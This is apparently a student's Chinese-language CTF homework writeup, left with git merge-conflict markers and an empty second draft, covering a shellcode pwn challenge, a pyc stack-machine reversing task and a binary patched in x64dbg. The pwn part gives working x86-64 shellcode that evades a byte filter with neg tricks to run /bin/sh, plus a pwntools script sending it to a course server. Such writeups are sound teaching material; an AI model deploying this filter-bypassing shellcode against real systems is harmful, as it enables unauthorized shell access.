<<<<<<< HEAD
# HW0x00 Writeup

## pwn

題目有給 source code ，可以看到主程式裡面有個 `void (*hello)()` 可以將 shellcode 傳入並呼叫，但在傳進去之前會做檢查，其中有限制不能有 `\x00` 、 `\x05` 、 `\x0f` ，分別代表是 null byte 跟 Linux 的 `syscall` 指令。

```c=
for( int i = 0 ; i < 0x100 ; ++i ){
        if( shellcode[i] == '\x00' || shellcode[i] == '\x05' || shellcode[i] == '\x0f' ){
            puts( "Oops" );
            _exit(-1);
        }
    }
```


因此在這個限制下，必須傳入的字串長度必須補滿以免被補上 null byte ，另外對 register 操作製造一個 `syscall` 之後我們再 call 它就不會在 shellcode 裡面看到 `\x05\x0f` 了。

為了讓 `hello()` 可以執行 `/bin/sh` ，先去查了 Linux x64 system call table ，可以看到呼叫 `sys_execve` ， `rax` 要放 `0x3b` ，而 `rdi`、`rsi`、`rdx` 分別代表 `const char* filename` 、 `const char* argv[]` 、 `const char* envp[]`，我們要執行 `/bin/sh` 基本上只需要在 `rdi` 裡放入 `"/bin/sh"` ，其餘放 `0` 即可。

而 `syscall` 的數字，可以先將它做成 `0xfaf1` ，以 `neg` 將他轉換回 `0x050f` 。

照這個想法ㄧ開始寫的 payload 是：

```=
_start:

xor rdx, rdx
xor rsi, rsi
mov r8, 0x68732f2f6e69622f
push r8
push rsp
pop r13
mov rdi, r13
push 0x3b
pop rax
mov r9, 0xfffffffffffffaf1
neg r9
push r9
push rsp
pop r14

call r14
```

但可以看到第五行因為裡面沒有 null byte ，所以不知道字串是否結束，傳進去的時候尾巴有一些奇怪的字元。

![](https://i.imgur.com/TsGcgnw.png)

所以選擇的策略是用造 `syscall` 一樣的方式，將 `"/bin/sh\x00"` 的 hex 做成 2's complement ，利用 `neg` 這個指令將其轉換回去我們想要的。

```=
_start:
xor rdx, rdx
xor rsi, rsi
mov r8, 0xff978cd091969dd1
neg r8
push r8
push rsp
pop rdi
push 0x3b
pop rax
mov r9, 0xfffffffffffffaf1
neg r9
push r9
push rsp
pop r14
call r14
```

這樣就沒有問題了，完整的 script 如下：

```python3=
from pwn import *

arch = context.update(arch='amd64', os='linux')
r = remote('edu-ctf.csie.org', 10150)

r.recvline()

shellcode = """
_start:
xor rdx, rdx
xor rsi, rsi
mov r8, 0xff978cd091969dd1
neg r8
push r8
push rsp
pop rdi
push 0x3b
pop rax
mov r9, 0xfffffffffffffaf1
neg r9
push r9
push rsp
pop r14
call r14
"""

payload = asm(shellcode, arch='amd64')

r.send(payload)

r.interactive()
```

## rev

這題給的是一個 `*.pyc` file ，所以先用網路上的 decompiler 將他還原成比較好讀的形式，只不過 Google 搜尋結果第一筆的 decompiler 會在 `assert` 的部份解析錯誤，所以需要修改一下。

基本上這個 stack machine 有以下這幾個運算：
* 0: add
* 1: cmp
* 2: call itself
* 3: clean up the list
* 6: pop out
* 7: push in
* 8: do the last two elements subsitution, then get rid of the last one.
* 9: do the character accuracy check, terminate the process if it is the wrong character.

而從 opcode 8 跟 9 的計算模式 （同時也把運算的過程印出來檢驗），可以得知字串的比對是從後面往前做的。因此，若要推算正確的 char 也要從後面往前推算。
![](https://i.imgur.com/mvusOQJ.png)


## misc

這題一樣有給 source code ，然後下方註解出題者有給佛心建議說可以從哪些步驟開始，但因為我不太想裝 Visual Studio ，在 Linux 跑 wine 就好了，所以載了 x64dbg 。

然後 x64dbg 有 bug 不能用 wine 跑 (uwu) 。

![](https://i.imgur.com/Aq4lZ8W.png)

查了很多資料之後覺得要 patch x64dbg 有點麻煩，就只好打開我的 Windows 環境。

然後 Windows 基於不知名原因沒有網路我什麼都不能裝 (uwu) 。

![](https://i.imgur.com/4ozeoTB.png)

只好切回 Linux 用 USB 裝了題目跟 debugger 檔案，切回去 Windows 放進去囉，讚喔。

基本上題目應該是要我們在執行過程中，從 debugger 中找到 memory 裡有沒有出現這次 random 出來的值為多少，這樣就能輸入正確的數值使 magic 跟 password 相等。但其實可以發現， magic 跟 password 的判斷式和 key 的比較之間其實是不會互相影響的，因此其實直接找到 `if (password == magic)` 所在的位置，將其從 `jne` patch 成 `je` 之類的就可以了。

只不過不知道為什麼 x64dbg 跑完程式之後就會馬上終止，所以來不及看到 flag 長怎樣，只好把斷點設在 `printf` 的位置，讓他一個字一個字把 flag 印出來，就大功告成了！

喔對因為電腦沒網路、筆電剛好也不在身邊，我沒辦法直接提交 flag ，只好用 genius 的方式把 flag 的畫面拍下來。

![](https://i.imgur.com/NmwAv7z.jpg)

![](https://i.imgur.com/1M2Gp8B.png)

=======
# HW0x00

## pwn - shellc0de

### Solution

首先看到 source code 有擋

## rev - m4chine

### Solution


## misc - Winmagic

### Solution


--

## 我在課堂公布解法後才得知解法的題目

### encrypt

### backdoor
>>>>>>> 4257df81eaac22a5ebb9bb1e9110beb90d690eb7

